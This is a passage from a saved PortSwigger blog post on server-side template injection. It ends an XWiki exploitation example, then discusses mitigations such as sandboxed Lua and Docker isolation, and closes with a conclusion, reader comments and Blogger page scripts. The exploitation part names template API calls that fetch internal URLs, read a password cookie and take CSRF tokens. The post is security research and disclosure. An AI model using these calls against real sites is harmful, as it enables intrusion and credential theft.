<a href="http://1.bp.blogspot.com/-SCjQGGyPrNE/Vayung_qiVI/AAAAAAAAAE4/g2E8SxAXOBE/s1600/5%2B-%2BExploit.png" imageanchor="1"><img border="0" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/5+-+Exploit.png" style="margin-bottom: 10px; margin-top: 10px;"></a>
<br>
Although I chose to exploit <span class="code">$doc.save</span>, it is far from the only promising API method. Other potentially useful methods include <span class="code">$xwiki.getURLContent("http://internal-server.net")</span>, <span class="code">$request.getCookie("password").getValue()</span>, and <span class="code">$services.csrf.getToken()</span>.<br>
<br>
<div class="page-break">
</div>
<h2>
 <a href="https://www.blogger.com/null" name="Mitigations">Mitigations - Templating Safely</a></h2>
If user-supplied templates are a business requirement, how should they be implemented? We have already seen that regexes are not an effective defense, and parser-level sandboxes are error prone. The lowest risk approach is to simply use a trivial template engine such as Mustache, or Python's Template. MediaWiki has taken the approach of executing users' code using a sandboxed Lua environment where potentially dangerous modules and functions have been outright removed. This strategy appears to have held up well, given the lack of people compromising Wikipedia. In languages such as Ruby it may be possible to emulate this approach using monkey-patching.<br>
<br>
Another, complementary approach is to concede that arbitrary code execution is inevitable and sandbox it inside a locked-down Docker container. Through the use of capability-dropping, read-only filesystems, and kernel hardening it is possible to craft a 'safe' environment that is difficult to escape from.<br>
<h2>
<a href="https://www.blogger.com/null" name="Conclusion">Conclusion</a></h2>
Template Injection is only apparent to auditors who explicitly look for it, and may incorrectly appear to be low severity until resources are invested in assessing the template engine's security posture. This explains why Template Injection has remained relatively unknown up till now, and its prevalence in the wild remains to be determined. <br>
<br>
Template engines are server-side sandboxes. As a result, allowing untrusted users to edit templates introduces an array of serious risks, which may or may not be evident in the template system's documentation. Many modern technologies designed to prevent templates from doing harm are currently immature and should not be relied on except as a defense in depth measure.&nbsp;When Template Injection occurs, regardless of whether it was intentional, it is frequently a critical vulnerability that exposes the web application, the underlying webserver, and adjacent network services.<br>
<br>
By throroughly documenting this issue, and releasing automated detection via Burp Suite, we hope to raise awareness of it and significantly reduce its prevalence. 
<div style="clear: both;"></div>
</div>
<div class="post-footer">
<div class="post-footer-line post-footer-line-1">
<span class="post-author vcard">
<span class="fn" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person">
<meta content="https://www.blogger.com/profile/06531751017851398217" itemprop="url">
<a href="https://www.blogger.com/profile/06531751017851398217" rel="author" title="author profile">
<span itemprop="name">James Kettle</span>
</a>
</span>
</span>
<span class="post-timestamp">
at
<meta content="http://blog.portswigger.net/2015/08/server-side-template-injection.html" itemprop="url">
<a class="timestamp-link" href="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/PortSwigger Web Security Blog_ Server-Side Template Injection.html" rel="bookmark" title="permanent link"><abbr class="published" itemprop="datePublished" title="2015-08-05T19:00:00+01:00">7:00 PM</abbr></a>
</span>
<span class="post-comment-link">
</span>
</div>
<div class="post-footer-line post-footer-line-2">
<div class="goog-inline-block dummy-container"><g:plusone source="blogger:blog:plusone" href="http://blog.portswigger.net/2015/08/server-side-template-injection.html" size="medium"></g:plusone></div>
</div>
</div>
</div>
<div class="comments" id="comments">
<a name="comments"></a>
<h4>4 comments:</h4>
<div class="comments-content">
<script async="async" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/comments.js" type="text/javascript"></script>
<script type="text/javascript">
    (function() {
      var items = [{'id': '4930813076839796860', 'body': 'Nice work James. The research you did to uncover routes to RCE is spectacular. Well done, Sir. Well done.', 'timestamp': '1438800091328', 'permalink': 'http://blog.portswigger.net/2015/08/server-side-template-injection.html?showComment\0751438800091328\46m\0751#c4930813076839796860', 'author': {'name': 'LaNMaSteR53', 'avatarUrl': 'http://4.bp.blogspot.com/_onom99QYvBA/S3l9YTLXbcI/AAAAAAAAAIQ/SSNgH-kzOtg/S45-s35/logo.png', 'profileUrl': 'https://www.blogger.com/profile/12357525471403918550'}, 'displayTime': 'August 5, 2015 at 7:41 PM', 'deleteclass': 'item-control blog-admin pid-2111829429'}, {'id': '1630417689856802384', 'body': 'Really impressive work James... nice one!', 'timestamp': '1438823039966', 'permalink': 'http://blog.portswigger.net/2015/08/server-side-template-injection.html?showComment\0751438823039966\46m\0751#c1630417689856802384', 'author': {'name': 'Anonymous', 'avatarUrl': 'https://img1.blogblog.com/img/blank.gif', 'profileUrl': ''}, 'displayTime': 'August 6, 2015 at 2:03 AM', 'deleteclass': 'item-control blog-admin pid-999772272'}, {'id': '2749143925407406191', 'body': 'Wow. Like all great discoveries, it looks so easy once you know how. :)', 'timestamp': '1438862854897', 'permalink': 'http://blog.portswigger.net/2015/08/server-side-template-injection.html?showComment\0751438862854897\46m\0751#c2749143925407406191', 'author': {'name': 'Anonymous', 'avatarUrl': 'https://img1.blogblog.com/img/blank.gif', 'profileUrl': ''}, 'displayTime': 'August 6, 2015 at 1:07 PM', 'deleteclass': 'item-control blog-admin pid-811715162'}, {'id': '1274031451287619959', 'body': 'Thanks man!', 'timestamp': '1438883474342', 'permalink': 'http://blog.portswigger.net/2015/08/server-side-template-injection.html?showComment\0751438883474342\46m\0751#c1274031451287619959', 'author': {'name': 'Anonymous', 'avatarUrl': 'https://img1.blogblog.com/img/blank.gif', 'profileUrl': ''}, 'displayTime': 'August 6, 2015 at 6:51 PM', 'deleteclass': 'item-control blog-admin pid-229971146'}];
      var msgs = {'loadMore': 'Load more...', 'loading': 'Loading...', 'loaded': 'No more!', 'addComment': 'Add comment', 'reply': 'Reply', 'delete': 'Delete'};
      var config = {'blogId': '8503755746105415394', 'postId': '1895030275483636305', 'feed': 'http://blog.portswigger.net/feeds/1895030275483636305/comments/default', 'authorName': 'James Kettle', 'authorUrl': 'https://www.blogger.com/profile/06531751017851398217', 'baseUri': 'https://www.blogger.com', 'maxThreadDepth': 2};

// <![CDATA[
      var cursor = null;
      if (items && items.length > 0) {
        cursor = parseInt(items[items.length - 1].timestamp) + 1;
      }

      var bodyFromEntry = function(entry) {
        if (entry.gd$extendedProperty) {
          for (var k in entry.gd$extendedProperty) {
            if (entry.gd$extendedProperty[k].name == 'blogger.contentRemoved') {
              return '<span class="deleted-comment">' + entry.content.$t + '</span>';
            }
          }
        }
        return entry.content.$t;
      }

      var parse = function(data) {
        cursor = null;
        var comments = [];
        if (data && data.feed && data.feed.entry) {
          for (var i = 0, entry; entry = data.feed.entry[i]; i++) {
            var comment = {};
            // comment ID, parsed out of the original id format
            var id = /blog-(\d+).post-(\d+)/.exec(entry.id.$t);
            comment.id = id ? id[2] : null;
            comment.body = bodyFromEntry(entry);
            comment.timestamp = Date.parse(entry.published.$t) + '';
            if (entry.author && entry.author.constructor === Array) {
              var auth = entry.author[0];
              if (auth) {
                comment.author = {
                  name: (auth.name ? auth.name.$t : undefined),
                  profileUrl: (auth.uri ? auth.uri.$t : undefined),
                  avatarUrl: (auth.gd$image ? auth.gd$image.src : undefined)
                };
              }
            }
            if (entry.link) {
              if (entry.link[2]) {
                comment.link = comment.permalink = entry.link[2].href;
              }
              if (entry.link[3]) {
                var pid = /.*comments\/default\/(\d+)\?.*/.exec(entry.link[3].href);
                if (pid && pid[1]) {
                  comment.parentId = pid[1];
                }
              }
            }
            comment.deleteclass = 'item-control blog-admin';
            if (entry.gd$extendedProperty) {
              for (var k in entry.gd$extendedProperty) {
                if (entry.gd$extendedProperty[k].name == 'blogger.itemClass') {
                  comment.deleteclass += ' ' + entry.gd$extendedProperty[k].value;
                } else if (entry.gd$extendedProperty[k].name == 'blogger.displayTime') {
                  comment.displayTime = entry.gd$extendedProperty[k].value;
                }
              }
            }
            comments.push(comment);
          }
        }
        return comments;
      };

      var paginator = function(callback) {
        if (hasMore()) {
          var url = config.feed + '?alt=json&v=2&orderby=published&reverse=false&max-results=50';
          if (cursor) {
            url += '&published-min=' + new Date(cursor).toISOString();
          }
          window.bloggercomments = function(data) {
            var parsed = parse(data);
            cursor = parsed.length < 50 ? null
                : parseInt(parsed[parsed.length - 1].timestamp) + 1
            callback(parsed);
            window.bloggercomments = null;
          }
          url += '&callback=bloggercomments';
          var script = document.createElement('script');
          script.type = 'text/javascript';
          script.src = url;
          document.getElementsByTagName('head')[0].appendChild(script);
        }
      };
      var hasMore = function() {
        return !!cursor;
      };
      var getMeta = function(key, comment) {
        if ('iswriter' == key) {
          var matches = !!comment.author
              && comment.author.name == config.authorName
              && comment.author.profileUrl == config.authorUrl;
          return matches ? 'true' : '';
        } else if ('deletelink' == key) {
          return config.baseUri + '/delete-comment.g?blogID='
               + config.blogId + '&postID=' + comment.id;
        } else if ('deleteclass' == key) {
          return comment.deleteclass;
        }
        return '';
      };

      var replybox = null;
      var replyUrlParts = null;
      var replyParent = undefined;

      var onReply = function(commentId, domId) {
        if (replybox == null) {
          // lazily cache replybox, and adjust to suit this style:
          replybox = document.getElementById('comment-editor');
          if (replybox != null) {
            replybox.height = '250px';
            replybox.style.display = 'block';
            replyUrlParts = replybox.src.split('#');
          }
        }
        if (replybox && (commentId !== replyParent)) {
          document.getElementById(domId).insertBefore(replybox, null);
          replybox.src = replyUrlParts[0]
              + (commentId ? '&parentID=' + commentId : '')
              + '#' + replyUrlParts[1];
          replyParent = commentId;
        }
      };

      var hash = (window.location.hash || '#').substring(1);
      var startThread, targetComment;
      if (/^comment-form_/.test(hash)) {
        startThread = hash.substring('comment-form_'.length);
      } else if (/^c[0-9]+$/.test(hash)) {
        targetComment = hash.substring(1);
      }

      // Configure commenting API:
      var configJso = {
        'maxDepth': config.maxThreadDepth
      };
      var provider = {
        'id': config.postId,
        'data': items,
        'loadNext': paginator,
        'hasMore': hasMore,
        'getMeta': getMeta,
        'onReply': onReply,
        'rendered': true,
        'initComment': targetComment,
        'initReplyThread': startThread,
        'config': configJso,
        'messages': msgs
      };

      var render = function() {
        if (window.goog && window.goog.comments) {
          var holder = document.getElementById('comment-holder');
          window.goog.comments.render(holder, provider);
        }
      };

      // render now, or queue to render when library loads:
      if (window.goog && window.goog.comments) {
        render();
      } else {
        window.goog = window.goog || {};
        window.goog.comments = window.goog.comments || {};
        window.goog.comments.loadQueue = window.goog.comments.loadQueue || [];
        window.goog.comments.loadQueue.push(render);
      }
    })();
// ]]>
</script>
<div id="comment-holder">

<div id="bc_0_5C" kind="c"><div id="bc_0_5CT"><div id="bc_0_4T" class="comment-thread" kind="r" t="0" u="0"><ol id="bc_0_4TB"><li id="bc_0_0B" class="comment" kind="b"><div class="avatar-image-container"><img src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/logo.png"></div><div id="c4930813076839796860" class="comment-block"><div id="bc_0_0M" class="comment-header" kind="m"><cite class="user"><a rel="nofollow" href="https://www.blogger.com/profile/12357525471403918550">LaNMaSteR53</a></cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://blog.portswigger.net/2015/08/server-side-template-injection.html?showComment=1438800091328&m=1#c4930813076839796860">August 5, 2015 at 7:41 PM</a></span></div><p id="bc_0_0MC" class="comment-content">Nice work James. The research you did to uncover routes to RCE is spectacular. Well done, Sir. Well done.</p><span id="bc_0_0MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-2111829429"><a o="d" target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8503755746105415394&postID=4930813076839796860">Delete</a></span></span></div><div id="bc_0_0BR" class="comment-replies"></div><div id="bc_0_0B_box" class="comment-replybox-single"></div></li><li id="bc_0_1B" class="comment" kind="b"><div class="avatar-image-container"><img src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/anon36.png"></div><div id="c1630417689856802384" class="comment-block"><div id="bc_0_1M" class="comment-header" kind="m"><cite class="user">Anonymous</cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://blog.portswigger.net/2015/08/server-side-template-injection.html?showComment=1438823039966&m=1#c1630417689856802384">August 6, 2015 at 2:03 AM</a></span></div><p id="bc_0_1MC" class="comment-content">Really impressive work James... nice one!</p><span id="bc_0_1MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-999772272"><a o="d" target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8503755746105415394&postID=1630417689856802384">Delete</a></span></span></div><div id="bc_0_1BR" class="comment-replies"></div><div id="bc_0_1B_box" class="comment-replybox-single"></div></li><li id="bc_0_2B" class="comment" kind="b"><div class="avatar-image-container"><img src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/anon36.png"></div><div id="c2749143925407406191" class="comment-block"><div id="bc_0_2M" class="comment-header" kind="m"><cite class="user">Anonymous</cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://blog.portswigger.net/2015/08/server-side-template-injection.html?showComment=1438862854897&m=1#c2749143925407406191">August 6, 2015 at 1:07 PM</a></span></div><p id="bc_0_2MC" class="comment-content">Wow. Like all great discoveries, it looks so easy once you know how. :)</p><span id="bc_0_2MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-811715162"><a o="d" target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8503755746105415394&postID=2749143925407406191">Delete</a></span></span></div><div id="bc_0_2BR" class="comment-replies"></div><div id="bc_0_2B_box" class="comment-replybox-single"></div></li><li id="bc_0_3B" class="comment" kind="b"><div class="avatar-image-container"><img src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/anon36.png"></div><div id="c1274031451287619959" class="comment-block"><div id="bc_0_3M" class="comment-header" kind="m"><cite class="user">Anonymous</cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://blog.portswigger.net/2015/08/server-side-template-injection.html?showComment=1438883474342&m=1#c1274031451287619959">August 6, 2015 at 6:51 PM</a></span></div><p id="bc_0_3MC" class="comment-content">Thanks man!</p><span id="bc_0_3MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-229971146"><a o="d" target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8503755746105415394&postID=1274031451287619959">Delete</a></span></span></div><div id="bc_0_3BR" class="comment-replies"></div><div id="bc_0_3B_box" class="comment-replybox-single"></div></li></ol><div id="bc_0_4I" class="continue" kind="ci" style="display: none;"><a href="javascript:;" target="_self">Add comment</a></div><div id="bc_0_4T_box" class="comment-replybox-thread"><iframe allowtransparency="true" class="blogger-iframe-colorize blogger-comment-from-post" frameborder="0" height="254px" id="comment-editor" name="comment-editor" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/comment-iframe.html" style="display: block;" width="100%"></iframe></div><div id="bc_0_4L" class="loadmore loaded" kind="rb"><a href="javascript:;" target="_self">Load more...</a></div></div></div></div></div>
</div>
<p class="comment-footer">
</p><div class="comment-form">
<a name="comment-form"></a>
<p>
</p>
<a href="https://www.blogger.com/comment-iframe.g?blogID=8503755746105415394&postID=1895030275483636305&m=1&blogspotRpcToken=4094629" id="comment-editor-src"></a>

<script type="text/javascript" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/3996186021-comment_from_post_iframe.js"></script>
<script type="text/javascript">
      BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html');
    </script>
</div>
<p></p>
<div id="backlinks-container">
<div id="Blog1_backlinks-container">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="blog-pager" id="blog-pager">
<div class="mobile-link-button" id="blog-pager-older-link">
<a class="blog-pager-older-link" href="http://blog.portswigger.net/2015/07/noscript-xss-filter-bypass.html?m=1" id="Blog1_blog-pager-older-link" title="Older Post"></a>
</div>
<div class="mobile-link-button" id="blog-pager-home-link">
<a class="home-link" href="http://blog.portswigger.net/?m=1">Home</a>
</div>
<div class="mobile-desktop-link">
<a class="home-link" href="http://blog.portswigger.net/2015/08/server-side-template-injection.html?m=0">View web version</a>
</div>
</div>
<div class="clear"></div>
<script type="text/javascript">window.___gcfg = {'lang': 'en'};</script>
</div></div>
</div>
</div>
<div class="column-left-outer">
<div class="column-left-inner">
<aside>
</aside>
</div>
</div>
<div class="column-right-outer">
<div class="column-right-inner">
<aside>
</aside>
</div>
</div>
</div>
<div style="clear: both"></div>
<!-- columns -->
</div>
<!-- main -->
</div>
</div>
<div class="main-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<footer>
<div class="footer-outer">
<div class="footer-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left footer-fauxborder-left">
<div class="fauxborder-right footer-fauxborder-right"></div>
<div class="region-inner footer-inner">
<div class="foot section" id="footer-1"></div>
<!-- outside of the include in order to lock Attribution widget -->
<div class="foot section" id="footer-3" name="Footer"><div class="widget Attribution" id="Attribution1">
<div class="widget-content" style="text-align: center;">
Powered by <a href="https://www.blogger.com/" target="_blank">Blogger</a>.
</div>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=8503755746105415394&widgetType=Attribution&widgetId=Attribution1&action=editWidget&sectionId=footer-3" onclick="return _WidgetManager._PopupConfig(document.getElementById(&quot;Attribution1&quot;));" target="configAttribution1" title="Edit">
<img alt="" height="18" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/icon18_wrench_allbkg.png" width="18">
</a>
</span>
</span>
<div class="clear"></div>
</div></div>
</div>
</div>
<div class="footer-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</footer>
<!-- content -->
</div>
</div>
<div class="content-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<script type="text/javascript">
    window.setTimeout(function() {
        document.body.className = document.body.className.replace('loading', '');
      }, 10);
  </script>
<script type="text/javascript">
if (window.jstiming) window.jstiming.load.tick('widgetJsBefore');
</script><script type="text/javascript" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/1514304437-widgets.js"></script>
<script type="text/javascript" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/plusone.js"></script><iframe frameborder="0" id="google_top_static_frame" name="google_top_static_frame" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/blank.html" style="height: 0px; width: 0px; position: absolute;"></iframe>
<script type="text/javascript">
if (typeof(BLOG_attachCsiOnload) != 'undefined' && BLOG_attachCsiOnload != null) { window['blogger_templates_experiment_id'] = "templatesV2";window['blogger_blog_id'] = '8503755746105415394';BLOG_attachCsiOnload('item_'); }var BLOG_BASE_IMAGE_URL = 'https://img2.blogblog.com/img';var BLOG_LANG_DIR = 'ltr';var f=Math,g=window,m=document,n="addEventListener",p="slice",r="call",t="prototype",u="appendChild",v="indexOf",A="apply",B="length",C="createElement",D="",E=" ",F='");  border-radius: 0 60px 60px 0;  left: -60px;}#right-arrow {  background-image: url("',H='");  border-radius: 60px 0 0 60px;  right: -60px;}#left-arrow:after, #right-arrow:after {  background-color:',I='");  display: none;  line-height: 0;  vertical-align: middle;}#arrow-container.navigating #left-arrow:after,#arrow-container.navigating #right-arrow:after {  display: inline-block;}',
J="#arrow-container {  display: none;  height: 120px;  margin-top: -60px;  overflow: hidden;  position: absolute;  width: 100%;}#arrow-container.prerender, #arrow-container.swiping {  display: block;}#left-arrow, #right-arrow {  background-color:",N="/mobile-swipe-arrow-left.png",aa="/mobile-swipe-arrow-right.png",ba="/mobile-swipe-loading.gif",ca=';  background-position: center center;  background-repeat: no-repeat;  display: inline-block;  height: 120px;  line-height: 120px;  position: absolute;  text-align: center;  width: 60px;}#left-arrow {  background-image: url("',
da=";  border: solid 2px ",ea=';  content: url("',fa="Blog1_blog-pager-newer-link",ga="Blog1_blog-pager-older-link",ha="arrow-container",ia="arrow-slider",ja="black",O="div",ka="head",la="http://img2.blogblog.com/img",ma="left-arrow",na="main",oa="native code",pa="navigating",qa="ontouchstart",P="prerender",ra="px",sa="px, 0, 0)",ta="right-arrow",ua="rtl",va="string",wa="style",Q="swiping",xa="touchend",ya="touchmove",za="touchstart",Aa="translate3d(";function R(a){return typeof a==va}
function Ba(a,c,b){return a[r][A](a.bind,arguments)}function Ca(a,c,b){if(!a)throw Error();if(2<arguments[B]){var d=Array[t][p][r](arguments,2);return function(){var b=Array[t][p][r](arguments);Array[t].unshift[A](b,d);return a[A](c,b)}}return function(){return a[A](c,arguments)}}function S(a,c,b){S=Function[t].bind&&-1!=Function[t].bind.toString()[v](oa)?Ba:Ca;return S[A](null,arguments)};var T=Array[t],U=T[v]?function(a,c,b){return T[v][r](a,c,b)}:function(a,c,b){b=null==b?0:0>b?f.max(0,a[B]+b):b;if(R(a))return R(c)&&1==c[B]?a[v](c,b):-1;for(;b<a[B];b++)if(b in a&&a[b]===c)return b;return-1},Da=T.filter?function(a,c,b){return T.filter[r](a,c,b)}:function(a,c,b){for(var d=a[B],h=[],q=0,w=R(a)?a.split(D):a,e=0;e<d;e++)if(e in w){var G=w[e];c[r](b,G,e,a)&&(h[q++]=G)}return h};function V(a,c,b){return 2>=arguments[B]?T[p][r](a,c):T[p][r](a,c,b)};function W(a){a=a.className;return R(a)&&a.match(/\S+/g)||[]}function X(a,c){for(var b=W(a),d=V(arguments,1),h=b,q=0;q<d[B];q++)0<=U(h,d[q])||h.push(d[q]);a.className=b.join(E)}function Y(a,c){var b=W(a),d=V(arguments,1),b=Ea(b,d);a.className=b.join(E)}function Ea(a,c){return Da(a,function(a){return!(0<=U(c,a))})};function Z(a,c,b,d,h){this.s=c;this.o=b;this.h=d;this.u=h||4;this.c=!1;this.a=this.b=this.g=this.f=0;a[n]&&(a[n](za,S(this.m,this),!1),a[n](ya,S(this.l,this),!1),a[n](xa,S(this.j,this),!1))}Z[t].m=function(a){a=a.targetTouches;1==a[B]?(this.f=a[0].pageX,this.g=a[0].pageY,this.a=this.b=0,this.c=!0):(this.h(0),this.c=!1)};
Z[t].l=function(a){if(this.c){var c=a.targetTouches[0];this.b=c.pageX-this.f;if(0==this.a){var b=f.abs(this.b),c=f.abs(c.pageY-this.g);this.a=b+c<this.u?0:b>1.73*c?1:2;1==this.a&&this.s()}2!=this.a&&(a.preventDefault(),1==this.a&&this.o(this.b))}};Z[t].j=function(a){this.c&&1==this.a&&(this.c=!1,a.preventDefault(),this.h(this.b))};(function(){function a(){K||(L=k=0,X(l,Q),l.style.top=g.innerHeight/2+m.body.scrollTop+ra)}function c(a){K||(k+=a-L,k=f.max(f.min(k,x),-x),L=a,d(k/x))}function b(){var a=0>k?y:z;f.abs(k)<x||!a||!a.href?Y(l,Q):(X(l,pa),d(0>k?-1:1),m.location=a.href,K=!0)}function d(a){M.style.opacity=f.abs(a)+D;M.style.webkitTransform=Aa+60*a+sa}function h(a){var b=m[C](wa);b[u](m.createTextNode(J+a+ca+Fa+F+Ga+H+a+da+a+ea+G+I));return b}function q(a,b){var c=m[C](O);c.id=ha;var d=m[C](O);d.id=ia;if(a){var e=w(ma);
d[u](e)}b&&(e=w(ta),d[u](e));c[u](d);return c}function w(a){var b=m[C](O);b.id=a;return b}var e=e||la,G=e+ba,Fa=e+N,Ga=e+aa,x=60,l,M,k,L,z,y,K=!1;return{i:function(){if(qa in g){var d=m.getElementById(ga),e=m.getElementById(fa);if(d||e)z=d,y=e,BLOG_LANG_DIR===ua&&(z=e,y=d),new Z(m.getElementById(na),a,c,b),x=f.max(.15*screen.width,60),d=z||y,e=ja,d&&d.parentElement&&(e=g.getComputedStyle(d.parentElement).backgroundColor),d=h(e),(m.getElementsByTagName(ka)[0]||m.body)[u](d),l=q(!!z,!!y),m.body[u](l),
M=l.firstChild,X(l,P),g.setTimeout(function(){Y(l,P)},0)}}}})().i();
_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d8503755746105415394','//blog.portswigger.net/2015/08/server-side-template-injection.html?m\x3d1','8503755746105415394');
_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '8503755746105415394', 'bloggerUrl': 'https://www.blogger.com', 'title': 'PortSwigger Web Security Blog', 'pageType': 'item', 'postId': '1895030275483636305', 'url': 'http://blog.portswigger.net/2015/08/server-side-template-injection.html?m\0751', 'canonicalUrl': 'http://blog.portswigger.net/2015/08/server-side-template-injection.html', 'canonicalHomepageUrl': 'http://blog.portswigger.net/', 'homepageUrl': 'http://blog.portswigger.net/?m\0751', 'blogspotFaviconUrl': 'http://blog.portswigger.net/favicon.ico', 'enabledCommentProfileImages': true, 'adultContent': false, 'disableAdSenseWidget': false, 'analyticsAccountNumber': '', 'searchLabel': '', 'searchQuery': '', 'pageName': 'Server-Side Template Injection', 'pageTitle': 'PortSwigger Web Security Blog: Server-Side Template Injection', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'isPrivate': false, 'isMobile': true, 'isMobileRequest': true, 'mobileClass': ' mobile', 'isPrivateBlog': false, 'languageDirection': 'ltr', 'feedLinks': '\74link rel\75\42alternate\42 type\75\42application/atom+xml\42 title\75\42PortSwigger Web Security Blog - Atom\42 href\75\42http://blog.portswigger.net/feeds/posts/default\42 /\76\n\74link rel\75\42alternate\42 type\75\42application/rss+xml\42 title\75\42PortSwigger Web Security Blog - RSS\42 href\75\42http://blog.portswigger.net/feeds/posts/default?alt\75rss\42 /\76\n\74link rel\75\42service.post\42 type\75\42application/atom+xml\42 title\75\42PortSwigger Web Security Blog - Atom\42 href\75\42https://www.blogger.com/feeds/8503755746105415394/posts/default\42 /\76\n\n\74link rel\75\42alternate\42 type\75\42application/atom+xml\42 title\75\42PortSwigger Web Security Blog - Atom\42 href\75\42http://blog.portswigger.net/feeds/1895030275483636305/comments/default\42 /\76\n', 'meTag': '', 'openIdOpTag': '', 'postImageThumbnailUrl': 'http://2.bp.blogspot.com/-AuKtbK95XLc/VayupXh78gI/AAAAAAAAAEw/VVSqLwQUrOQ/s72-c/pretty%2Bmethodology%2Bdiagram.png', 'postImageUrl': 'http://2.bp.blogspot.com/-AuKtbK95XLc/VayupXh78gI/AAAAAAAAAEw/VVSqLwQUrOQ/s320/pretty%2Bmethodology%2Bdiagram.png', 'latencyHeadScript': '\74script type\75\42text/javascript\42\76(function() { var b\75window,f\75\42chrome\42,g\75\42tick\42,k\75\42jstiming\42;(function(){function d(a){this.t\75{};this.tick\75function(a,d,c){var e\75void 0!\75c?c:(new Date).getTime();this.t[a]\75[e,d];if(void 0\75\75c)try{b.console.timeStamp(\42CSI/\42+a)}catch(h){}};this[g](\42start\42,null,a)}var a;b.performance\46\46(a\75b.performance.timing);var n\75a?new d(a.responseStart):new d;b.jstiming\75{Timer:d,load:n};if(a){var c\75a.navigationStart,h\75a.responseStart;0\74c\46\46h\76\75c\46\46(b[k].srt\75h-c)}if(a){var e\75b[k].load;0\74c\46\46h\76\75c\46\46(e[g](\42_wtsrt\42,void 0,c),e[g](\42wtsrt_\42,\42_wtsrt\42,h),e[g](\42tbsd_\42,\42wtsrt_\42))}try{a\75null,\nb[f]\46\46b[f].csi\46\46(a\75Math.floor(b[f].csi().pageT),e\46\0460\74c\46\46(e[g](\42_tbnd\42,void 0,b[f].csi().startE),e[g](\42tbnd_\42,\42_tbnd\42,c))),null\75\75a\46\46b.gtbExternal\46\46(a\75b.gtbExternal.pageT()),null\75\75a\46\46b.external\46\46(a\75b.external.pageT,e\46\0460\74c\46\46(e[g](\42_tbnd\42,void 0,b.external.startE),e[g](\42tbnd_\42,\42_tbnd\42,c))),a\46\46(b[k].pt\75a)}catch(p){}})();b.tickAboveFold\75function(d){var a\0750;if(d.offsetParent){do a+\75d.offsetTop;while(d\75d.offsetParent)}d\75a;750\76\75d\46\46b[k].load[g](\42aft\42)};var l\75!1;function m(){l||(l\75!0,b[k].load[g](\42firstScrollTime\42))}b.addEventListener?b.addEventListener(\42scroll\42,m,!1):b.attachEvent(\42onscroll\42,m);\n })();\74/script\076', 'mobileHeadScript': '', 'ieCssRetrofitLinks': '\74!--[if IE]\76\74script type\75\42text/javascript\42 src\75\42https://www.blogger.com/static/v1/jsbin/1333113279-ieretrofit.js\42\76\74/script\76\n\74![endif]--\076', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/cda3ddef07a85452', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'sf': 'n', 'tf': ''}}, {'name': 'skin', 'data': {'vars': {'post_footer_background_color': '#eeeeee', 'tabs_text_color': '#000000', 'date_header_letterspacing': '3px', 'content_shadow_spread': '0', 'body_background_override': '', 'description_text_size': '18px', 'mobile_background_size': 'auto', 'header_shadow_spread': '0', 'image_border_color': '#eeeeee', 'date_header_color': '#ffffff', 'header_shadow_offset_top': '0', 'header_border_horizontalsize': '1px', 'widget_title_font': 'normal bold 11px \47Trebuchet MS\47,Trebuchet,Verdana,sans-serif', 'tabs_border_color': '#dddddd', 'tabs_bevel_border_width': '1px', 'body_background_gradient_tile': 'none', 'description_text_color': '#000000', 'main_section_margin': '1em', 'post_title_font': 'normal normal 22px \47Trebuchet MS\47,Trebuchet,Verdana,sans-serif', 'page_width': 'auto', 'paging_background': 'transparent url(//www.blogblog.com/1kt/simple/paging_dot.png) repeat-x scroll top center', 'body_text_color': '#666666', 'content_padding': '10px', 'header_background_gradient': 'none', 'post_margin_bottom': '45px', 'header_shadow_offset_left': '0', 'tabs_background_color': 'transparent', 'content_background_color': '#ffffff', 'body_background_gradient_cap': 'none', 'main_padding_top': '35px', 'widget_alternate_text_color': '#999999', 'image_text_color': '#666666', 'link_visited_color': '#888888', 'tabs_margin_side': '30px', 'image_border_large_size': '5px', 'content_shadow_spread_webkit': '0', 'mobile_button_color': '#ffffff', 